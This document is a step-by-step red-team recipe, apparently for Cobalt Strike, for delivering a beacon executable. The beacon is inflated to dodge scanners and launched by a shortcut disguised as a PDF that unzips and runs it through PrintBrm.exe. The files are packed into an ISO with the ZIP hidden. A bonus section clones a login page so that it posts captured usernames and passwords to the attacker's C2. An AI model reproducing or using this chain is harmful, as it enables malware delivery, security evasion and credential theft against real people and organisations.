# EXE with LNK + CMD

1. Generate the EXE
	* Attacks - Packages - Windows Executable (S)
      Field | Option
      ----- | -----
      Listener | HTTPS
      Output | Windows EXE 
      x64 | Checked 

   * Name the file `14-https.exe`

2. Download [Inflate.py](https://github.com/nayjones/inflate.py)
3. Inflate `14-https.exe` to be obnoxious
```
python2.7 inflate.py -f <beacon.exe> -s 2133
```
4. Move the inflated EXE to Windows
5. Create a malicious LNK file
```
$path                      = "$([Environment]::GetFolderPath('Desktop'))\Document.pdf.lnk"
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)

$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"
$shortcut.TargetPath       = "cmd.exe"
$shortcut.WorkingDirectory = ""
$shortcut.Description      = "2L2Q"

$shortcut.WindowStyle      = 7

$shortcut.Save()
```
6. Add the ZIP to a folder on the Desktop called ZIPME
7. ZIP the EXE using PrintBrm
```
C:\Windows\System32\spool\tools\PrintBrm.exe -b -d C:\Users\Administrator\Desktop\ZIPME -f C:\Users\Administrator\Desktop\14-https-inflate.zip
```
8. Right click the new LNK file and select Properties
9. Edit the `Target` options to:
```
C:\Windows\System32\cmd.exe /c xcopy .\14-https-inflate.zip %TEMP% /h /y && C:\Windows\System32\spool\tools\PrintBrm.exe -r -f %TEMP%\14-https-inflate.zip -d %TEMP%\unzip & %TEMP%\unzip\14-https-inflate.exe 
```
10. Move the LNK and ZIP file to the share and move to Kali
11. Make the ISO with the hidden ZIP file with the following command
```
mkisofs -o /share/Working/name/14/14-https-inflate.iso -J -r -V "14-https-inflate" -hidden /share/Working/name/14/14-https-inflate.zip -graft-points "/=/share/Working/name/14"
```
**BONUS ROUND**
* Combine this with internal phishing
	* Make a clone of their login page with a tool like `SingleFile`
	* Modify the HTML code to send the username/password as a POST request to your C2
	* Add the HTML file (a.html) to the same folder above in Step 6
	* Modify the LNK file to be
    ```bash
    C:\Windows\System32\cmd.exe /c xcopy .\14-https-inflate.zip %TEMP% /h /y && C:\Windows\System32\spool\tools\PrintBrm.exe -r -f %TEMP%\14-https-inflate.zip -d %TEMP%\unzip & "C:\Program Files\Internet Explorer\iexplore.exe" -k %TEMP%/unzip/a.html & %TEMP%\unzip\14-https-inflate.exe 
    ```
	* ZIP up the EXE and HTML page as noted in step 7
	* Move the ZIP and LNK over to Kali and make the ISO the same way
